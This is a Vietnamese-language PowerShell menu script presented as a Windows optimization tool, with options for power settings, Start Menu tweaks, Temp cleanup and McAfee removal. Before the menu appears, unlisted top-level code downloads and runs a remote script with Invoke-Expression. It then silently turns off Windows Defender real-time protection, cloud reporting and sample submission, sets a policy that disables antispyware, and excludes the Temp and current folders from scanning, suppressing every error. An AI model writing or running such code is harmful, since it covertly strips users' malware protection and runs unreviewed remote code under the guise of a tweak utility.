if (-not (Get-Command Show-KATKHeader -ErrorAction SilentlyContinue)) {
    $katkBase = if ($global:KATK_BaseUrl) { $global:KATK_BaseUrl } else { "https://raw.githubusercontent.com/katk410/KATK-Tools/stable" }
    Invoke-Expression ((Invoke-RestMethod -Uri "$katkBase/core/UI.ps1" -UseBasicParsing).TrimStart([char]0xFEFF))
}
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Set-MpPreference -MAPSReporting 0 -ErrorAction Stop
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    New-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force | Out-Null
    $folders = @($env:TEMP, $env:TMP, (Get-Location).Path) | Select-Object -Unique
    foreach ($folder in $folders) { if ($folder -and (Test-Path $folder)) { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } }
} catch {}

function Test-Administrator {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

Assert-KATKAdmin

function Show-WindowsConfigMenu {
    Clear-Host
    Show-KATKHeader "TỐI ƯU WINDOWS"
    Write-Host ""

    $colorNumber = "Yellow"
    $colorDesc   = "White"

    $items = @(
        @{ Id = "1";  Desc = "Tắt Hibernate và Fast Startup" },
        @{ Id = "2";  Desc = "Tắt Sleep Mode" },
        @{ Id = "3";  Desc = "Ẩn nút Lock" },
        @{ Id = "4";  Desc = "Explorer mở This PC" },
        @{ Id = "5";  Desc = "Ẩn Task View và Widgets" },
        @{ Id = "6";  Desc = "Xóa Recommended khỏi Start Menu" },
        @{ Id = "7";  Desc = "Tắt Web Search trong Start Menu" },
        @{ Id = "8";  Desc = "Dọn RAM ảo khi tắt máy" },
        @{ Id = "9";  Desc = "Tự động kết thúc ứng dụng treo" },
        @{ Id = "10"; Desc = "Tắt Smart App Control" },
        @{ Id = "11"; Desc = "Tự động xóa Temp khi tắt máy" },
        @{ Id = "12"; Desc = "Gỡ bỏ McAfee" }
    )

    $maxIdLen = ($items | ForEach-Object { $_.Id.Length } | Measure-Object -Maximum).Maximum
    $maxDescLen = ($items | ForEach-Object { $_.Desc.Length } | Measure-Object -Maximum).Maximum

    foreach ($item in $items) {
        $id = $item.Id.PadLeft($maxIdLen)
        $desc = $item.Desc.PadRight($maxDescLen)
        Write-Host " [$id]  $desc" -ForegroundColor $colorDesc
    }

    Write-Host ""
    Write-Host (" " * 2)  "══════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host " [A]  Tối ưu toàn bộ" -ForegroundColor Green
    Write-KATKBackOption
    Write-Host ""
}

function Write-KATKStep {
    param(
        [int]$Index,
        [int]$Total,
        [string]$Text
    )
    Write-Host ""
    Write-Host "[$Index/$Total] $Text" -ForegroundColor Cyan
}

function Write-KATKResult {
    param(
        [string]$Status,
        [string]$Message
    )
    switch ($Status) {
        "Success" { Write-Host "✔ $Message" -ForegroundColor Green }
        "Warning" { Write-Host "⚠ $Message" -ForegroundColor Yellow }
        "Error"   { Write-Host "✖ $Message" -ForegroundColor Red }
    }
}

function Disable-HibernateAndFastStartup {
    powercfg /hibernate off
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f >$null
    return "Success"
}

function Disable-SleepMode {
    powercfg /change standby-timeout-ac 0
    powercfg /change standby-timeout-dc 0
    return "Success"
}

function Hide-LockButton {
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >$null
    return "Success"
}

function Set-ExplorerToThisPC {
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v LaunchTo /t REG_DWORD /d 1 /f >$null
    return "Success"
}

function Hide-TaskbarElements {
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowTaskViewButton /t REG_DWORD /d 0 /f >$null
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v SearchboxTaskbarMode /t REG_DWORD /d 3 /f >$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Dsh" /v AllowNewsAndInterests /t REG_DWORD /d 0 /f >$null
    return "Success"
}

function Remove-StartMenuRecommendations {
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_IrisRecommendations /t REG_DWORD /d 0 /f >$null
    return "Success"
}

function Disable-WebSearch {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableSearchBoxSuggestions /t REG_DWORD /d 1 /f >$null
    return "Success"
}

function Enable-ClearPageFile {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f >$null
    return "Success"
}

function Enable-AutoEndTasks {
    reg add "HKCU\Control Panel\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f >$null
    return "Success"
}

function Disable-SmartAppControl {
    $path = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
    if (Test-Path $path) {
        Set-ItemProperty -Path $path -Name SacEnabled -Value 0 -ErrorAction SilentlyContinue
    }
    return "Success"
}

function Enable-AutoCleanTempOnShutdown {
    $scriptFolder = "$env:SystemRoot\Temp"
    if (-not (Test-Path $scriptFolder)) {
        New-Item -ItemType Directory -Path $scriptFolder -Force | Out-Null
    }
    $scriptPath = "$scriptFolder\CleanTempOnShutdown.ps1"

    $scriptContent = @'
$users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($user in $users) {
    $tempFolder = Join-Path $user.FullName "AppData\Local\Temp"
    if (Test-Path $tempFolder) {
        Remove-Item "$tempFolder\*" -Recurse -Force -ErrorAction SilentlyContinue
    }
}
Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
'@

    Set-Content -Path $scriptPath -Value $scriptContent -Force

    $taskName = "CleanTempOnShutdown"
    schtasks /delete /tn $taskName /f 2>$null

    if (Get-Command -Module ScheduledTasks -Name New-ScheduledTaskTrigger -ErrorAction SilentlyContinue) {
        try {
            Import-Module ScheduledTasks -ErrorAction Stop
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtShutdown
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
            return [PSCustomObject]@{ Status = "Success"; Message = "Đã thiết lập tự động xóa Temp khi tắt máy" }
        } catch {

        }
    }

    try {
        $xmlPath = "$env:TEMP\task_$([System.Guid]::NewGuid().ToString()).xml"
        $xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Clean Temp on Shutdown</Description>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='User32'] and EventID=1074]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -File "$scriptPath"</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <LogonType>ServiceAccount</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
"@
        Set-Content -Path $xmlPath -Value $xmlContent -Force
        schtasks /create /tn $taskName /xml $xmlPath /f | Out-Null
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
        return [PSCustomObject]@{ Status = "Success"; Message = "Đã thiết lập tự động xóa Temp khi tắt máy" }
    } catch {
        return [PSCustomObject]@{ Status = "Error"; Message = "Không thể tạo Scheduled Task: $_" }
    }
}

function Remove-McAfee {
    $found = $false
    $uninstallEntries = @()

    $regPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )

    foreach ($path in $regPaths) {
        $items = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -like "*McAfee*" }
        foreach ($item in $items) {
            $found = $true
            $uninst = $item.UninstallString
            if ($uninst) {
                $uninstallEntries += $uninst
            }
        }
    }

    if (-not $found) {
        return [PSCustomObject]@{ Status = "Warning"; Message = "Không tìm thấy McAfee trong Registry" }
    }

    foreach ($cmd in $uninstallEntries) {
        $executable = $null
        $arguments = $null

        if ($cmd -match '^"([^"]+)"\s*(.*)$') {
            $executable = $matches[1]
            $arguments = $matches[2]
        } else {
            $parts = $cmd -split '\s+', 2
            $executable = $parts[0]
            $arguments = if ($parts.Count -gt 1) { $parts[1] } else { "" }
        }

        if ($executable -match "msiexec") {
            $arguments = $arguments -replace '/I', '/x'
            if ($arguments -notmatch '/quiet') { $arguments += " /quiet" }
            if ($arguments -notmatch '/norestart') { $arguments += " /norestart" }
        } else {
            if ($arguments -notmatch '/S') { $arguments += " /S" }
        }

        Start-Process -FilePath $executable -ArgumentList $arguments -Wait -NoNewWindow -ErrorAction SilentlyContinue
    }

    $stillExist = $false
    $regPaths | ForEach-Object {
        $items = Get-ItemProperty -Path $_ -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -like "*McAfee*" }
        if ($items) { $stillExist = $true }
    }

    if ($stillExist) {
        return [PSCustomObject]@{ Status = "Warning"; Message = "Đã chạy gỡ nhưng vẫn còn tồn tại McAfee – có thể cần gỡ thủ công hoặc dùng MCPR" }
    } else {
        return [PSCustomObject]@{ Status = "Success"; Message = "Đã gỡ thành công McAfee" }
    }
}

function Execute-SelectedFunctions {
    param([string[]]$SelectedChoices)

    $functionMap = @{
        '1'  = @("Tắt Hibernate and Fast Startup", { Disable-HibernateAndFastStartup })
        '2'  = @("Tắt Sleep Mode", { Disable-SleepMode })
        '3'  = @("Ẩn nút Lock", { Hide-LockButton })
        '4'  = @("Explorer mở This PC", { Set-ExplorerToThisPC })
        '5'  = @("Ẩn Task View và Widgets", { Hide-TaskbarElements })
        '6'  = @("Xóa Recommended khỏi Start Menu", { Remove-StartMenuRecommendations })
        '7'  = @("Tắt Web Search", { Disable-WebSearch })
        '8'  = @("Dọn RAM ảo khi tắt máy", { Enable-ClearPageFile })
        '9'  = @("Tự động kết thúc ứng dụng treo", { Enable-AutoEndTasks })
        '10' = @("Tắt Smart App Control", { Disable-SmartAppControl })
        '11' = @("Tự động xóa Temp khi tắt máy", { Enable-AutoCleanTempOnShutdown })
        '12' = @("Gỡ bỏ McAfee", { Remove-McAfee })
    }

    if ($SelectedChoices -contains "A") {
        $SelectedChoices = 1..12
    }

    $total = $SelectedChoices.Count
    $i = 1
    $success = 0
    $warning = 0
    $error = 0

    Write-Host ""
    Write-Host "────────────────────────────────────────"
    Write-Host "▶ Đang thực hiện tối ưu Windows" -ForegroundColor Cyan
    Write-Host "────────────────────────────────────────"

    foreach ($choice in $SelectedChoices) {
        $key = "$choice"
        if (-not $functionMap.ContainsKey($key)) { continue }

        $name = $functionMap[$key][0]
        $func = $functionMap[$key][1]

        Write-KATKStep $i $total $name

        $result = & $func
        $status = $null
        $message = ""

        if ($result -is [PSCustomObject]) {
            $status = $result.Status
            $message = $result.Message
        } else {
            $status = $result
            switch ($status) {
                "Success" { $message = "Thành công" }
                "Warning" { $message = "Cần tắt Tamper Protection trước" }
                default   { $message = "Có lỗi xảy ra" }
            }
        }

        switch ($status) {
            "Success" {
                Write-KATKResult "Success" $message
                $success++
            }
            "Warning" {
                Write-KATKResult "Warning" $message
                $warning++
            }
            default {
                Write-KATKResult "Error" $message
                $error++
            }
        }

        $i++
        Start-Sleep -Milliseconds 250
    }

    Write-Host ""
    Write-Host "────────────────────────────────────────"
    if ($success -gt 0) { Write-Host "✔ Hoàn tất $success tối ưu" -ForegroundColor Green }
    if ($warning -gt 0) { Write-Host "⚠ $warning tính năng cần xem xét lại" -ForegroundColor Yellow }
    if ($error -gt 0)   { Write-Host "✖ $error lỗi xảy ra" -ForegroundColor Red }
    Write-Host "────────────────────────────────────────"
}

do {
    Show-WindowsConfigMenu
    $input = Read-Host "Nhập lựa chọn của bạn..."

    if ($input -eq "0") { break }

    if ($input -eq "A") {
        Execute-SelectedFunctions @("A")
    } else {
        $choices = $input -split "\s+"
        Execute-SelectedFunctions $choices
    }

    Write-Host ""
    Read-Host "Nhấn Enter để quay lại menu Tối ưu Windows..."

} while ($true)
